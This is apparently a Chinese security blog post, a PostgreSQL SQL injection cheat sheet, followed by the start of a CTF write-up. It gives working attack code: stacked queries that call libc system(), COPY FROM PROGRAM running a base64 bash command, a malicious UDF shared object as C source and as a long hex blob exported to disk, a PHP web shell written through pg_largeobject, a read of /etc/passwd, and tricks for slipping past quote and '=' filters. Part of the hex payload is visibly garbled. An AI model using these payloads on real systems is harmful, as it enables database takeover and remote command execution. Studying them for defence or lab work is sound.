<p>获取当前schema的表名<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> tablename <span class="keyword">from</span> pg_tables <span class="keyword">where</span> schemaname <span class="operator">=</span> <span class="string">&#x27;public&#x27;</span>;</span><br><span class="line"><span class="comment">-- 或者从该库的information_schema.tables获取</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>获取当前表的列名:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> attname <span class="keyword">FROM</span> pg_namespace,pg_type,pg_attribute b <span class="keyword">JOIN</span> pg_class a <span class="keyword">ON</span> a.oid<span class="operator">=</span>b.attrelid <span class="keyword">WHERE</span> a.relnamespace<span class="operator">=</span>pg_namespace.oid <span class="keyword">AND</span> pg_type.oid<span class="operator">=</span>b.atttypid <span class="keyword">AND</span> attnum<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">AND</span> a.relname<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> nspname<span class="operator">=</span><span class="string">&#x27;public&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入:"></a>堆叠注入:</h2><p>由于postgresql默认支持堆叠查询，所以通常使用堆叠查询就直接getshell了</p>
<h3 id="8-2版本以下"><a href="#8-2版本以下" class="headerlink" title="8.2版本以下"></a>8.2版本以下</h3><p>直接调用<code>/lib/libc.so.6</code>或者是<code>/lib64/libc.so.6</code><br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) <span class="keyword">RETURNS</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> C STRICT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(cstring) RcETURNS <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib64/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> C STRICT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></p>
<h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>Postgres9.3版本以上新增了一个”COPY TO/FROM PROGRAM”功能,允许数据库的超级用户和<code>pg_read_server_files</code>组里的任何用户执行操作系统命令<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;echo dG91Y2ggL3RtcC9qbXg=|base64 -d|bash&#x27;;</span><br><span class="line">select * from cmd_exec;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240408231227.png" alt="image.png"></p>
<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>8.2版本以上存在安全机制无法调用系统libc.so.6,需要udf提权<br>查看postgresql支持的扩展语言:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pg_language;</span><br></pre></td></tr></table></figure><br>发现有c,需要自己上传恶意so<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">text *<span class="title function_">exec</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;touch /tmp/hack&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>需要存在<code>postgres.h</code>头文件<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find ./ -name &quot;postgres.h&quot;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240408232959.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so</span><br><span class="line">strip -sx udf.so #缩减so文件大小</span><br></pre></td></tr></table></figure>
<p>这里可以直接用别人的:<a href="https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql">https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql</a></p>
<p>cmd: <a href="https://github.com/No-Github/postgresql_udf_help">https://github.com/No-Github/postgresql_udf_help</a></p>
<p>直接现成<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT lo_create(9023);</span><br><span class="line"></span><br><span class="line">insert into pg_largeobject values (9023, 0, decode(&#x27;7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200&#x27;, &#x27;hex&#x27;));</span><br><span class="line">insert into pg_largeobject values (9023, 1, decode(&#x27;0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ffffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff&#x27;, &#x27;hex&#x27;));</span><br><span class="line">insert into pg_largeobject values (9023, 2, decode(&#x27;ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420ex27;, &#x27;hex&#x27;));</span><br><span class="line">insert into pg_largeobject values (9023, 3, decode(&#xb00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;, &#x27;hex&#x27;));</span><br><span class="line">insert into pg_largeobject values (9023, 4, decode(&#x27;181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a60000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000&#x27;, &#x27;hex&#x27;));</span><br><span class="line">insert into pg_largeobject values (9023, 5, decode(&#x27;d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000&#x27;, &#x27;hex&#x27;));</span><br><span class="line"></span><br><span class="line">SELECT lo_export(9023, &#x27;/tmp/testeval.so&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 创建命令</span><br><span class="line">CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS &#x27;/tmp/testeval.so&#x27;, &#x27;sys_eval&#x27; LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;</span><br><span class="line">-- 执行命令</span><br><span class="line">select sys_eval(&#x27;id&#x27;);</span><br><span class="line">-- 删除命令</span><br><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>CAST:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select cast((select version()) as int);</span><br><span class="line"></span><br><span class="line">select username from users where id=&#x27;1&#x27; and cast((select version()) as int) = 1;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240408230342.png" alt=""></p>
<p>::运算符<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select version()::text::int;</span><br><span class="line">select title from test where title=&#x27;a&#x27; and (select version()::text::int) = 1;</span><br></pre></td></tr></table></figure></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>和mysql一样:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select title from test where title=&#x27;a&#x27; and ascii(substring((select current_database()),1,1)) &gt; 99; -- true</span><br></pre></td></tr></table></figure></p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><ul>
<li>pg_sleep()</li>
<li>case when(expr1) then result1 else result2 end</li>
<li>pg_sleep_for(interval)</li>
</ul>
<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写:"></a>文件读写:</h2><p>文件读写在postgresql中比较方便利用，postgresql 8.1后提供了一组现成的文件操作函数（<code>pg_logdir_ls()</code>、<code>pg_ls_dir()</code>、<code>pg_file_rename()</code>、<code>pg_file_write()</code>、 <code>pg_read_file()</code>、<code>pg_length_file()</code>）来读取/写入，但是有限制，因为<code>pg_xxx</code>这个adminpack将权限限制在了<code>./postgresql/data</code></p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>创建数据表将读到的文件copy入表:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table if exists test;</span><br><span class="line">CREATE TABLE test(t TEXT);</span><br><span class="line">COPY test FROM &#x27;/etc/passwd&#x27;;</span><br><span class="line">SELECT * FROM test;</span><br><span class="line"></span><br><span class="line"># 堆叠，变成一句</span><br><span class="line">drop table if exists test;CREATE TABLE test(t TEXT);COPY test FROM &#x27;/etc/passwd&#x27;;SELECT * FROM test;</span><br></pre></td></tr></table></figure></p>
<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>利用copy<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">COPY (select &#x27;&lt;?php phpinfo();?&gt;&#x27;) to &#x27;/tmp/1.php&#x27;;</span><br></pre></td></tr></table></figure></p>
<h2 id="大数据写入"><a href="#大数据写入" class="headerlink" title="大数据写入"></a>大数据写入</h2><p><code>pg_largeobject</code>表保存那些标记着”大对象”的数据。 一个大对象是使用其创建时分配的 OID 标识的。 每个大对象都分解成足够小的小段或者”页面”以便以行的形式存储在 <code>pg_largeobject</code>里。 每页的数据定义为LOBLKSIZE(目前是BLCKSZ/4，或者通常是 2K 字节)<br>当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">9999</span>);</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid<span class="operator">=</span><span class="number">9999</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pg_largeobject (loid,pageno,data) <span class="keyword">values</span>(<span class="number">9999</span>, <span class="number">0</span>, decode(<span class="string">&#x27;3c3f706870204073797374656d2822245f4745545b636d645d22293b3f3e&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));  </span><br><span class="line"><span class="comment">-- 或 insert into pg_largeobject values(9999,0,&#x27;&lt;?php @system(&quot;$_GET[cmd]&quot;);?&gt;&#x27;);</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">9999</span>, <span class="string">&#x27;/tmp/shell.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">Select</span> lo_unlink(<span class="number">9999</span>);</span><br></pre></td></tr></table></figure>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h3><p>在postgresql里,所以的字段都需要单引号包裹,如果单引号被ban了怎么办?<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单引号的绕过:</span><br><span class="line">1.chr(120)||chr(120)</span><br><span class="line">||是字符串连接操作符，chr(120)是小写字母x，所以它的结果是xx</span><br><span class="line">2.$$xx$$</span><br><span class="line">$$表示包含特殊字符的字符串字面值,$$xx$$如果xx有单引号则不需要转义</span><br><span class="line">3.$quote: select $quote$1$quote$</span><br></pre></td></tr></table></figure></p>
<h3 id="绕过”-”"><a href="#绕过”-”" class="headerlink" title="绕过”=”"></a>绕过”=”</h3><div class="table-container">
<table>
<thead>
<tr>
<th>Payload</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;&gt;</code></td>
<td>不等符</td>
</tr>
<tr>
<td><code>select 1 between 1 and 2;</code></td>
<td>between语句</td>
</tr>
<tr>
<td><code>select &#39;123&#39; like &#39;1%&#39;;</code></td>
<td>模糊匹配</td>
</tr>
<tr>
<td><code>select &#39;abc&#39; SIMILAR TO &#39;%a%&#39;;</code>  <br><code>select &#39;abc&#39; SIMILAR TO &#39;%a(b｜d)%&#39;;</code></td>
<td>SIMILAR TO 正则匹配</td>
</tr>
<tr>
<td><code>select &#39;abc&#39; ~ &#39;abc&#39;;</code>  <br><code>select &#39;abc&#39; ~ &#39;^a&#39;;</code>  <br><code>select &#39;abc&#39; ~ &#39;(b｜d)&#39;;</code></td>
<td>POSIX正则匹配</td>
</tr>
</tbody>
</table>
</div>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/01.sql%E6%B3%A8%E5%85%A5/06.postgresql/02.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/01.sql%E6%B3%A8%E5%85%A5/06.postgresql/02.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95</a></li>
<li><a href="https://tttang.com/archive/1547/">https://tttang.com/archive/1547/</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF X GFCTF2024 | 四月开启第一局wp</title>
    <url>/2024/04/22/DASCTF%20X%20GFCTF%202024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/</url>
    <content><![CDATA[<h2 id="cool-index"><a href="#cool-index" class="headerlink" title="cool_index"></a>cool_index</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">index = <span class="built_in">parseInt</span>(index);</span><br></pre></td></tr></table></figure>
<p>考察parseInt()函数的特性<br>这个函数处理数组只取第一个值,或者处理数字开头的字符串也会只取前面的数字<br>eg.<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> index = <span class="built_in">parseInt</span>(<span class="string">&quot;7a&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> target=<span class="number">7</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(index);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(index&gt;target);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test2=<span class="title class_">Array</span>(<span class="string">&quot;7&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> res2=<span class="built_in">parseInt</span>(test2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(res2));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(res2));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res2&gt;<span class="number">7</span>);</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">7</span><br><span class="line">false</span><br><span class="line">false</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422001505.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422001557.png" alt="image.png"></p>
<h2 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h2><p>这里抓包很明显发现可以修改任意用户的密码,我们尝试修改admin的密码,然后登录admin的账号<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240422002028.png" alt="image.png"></p>
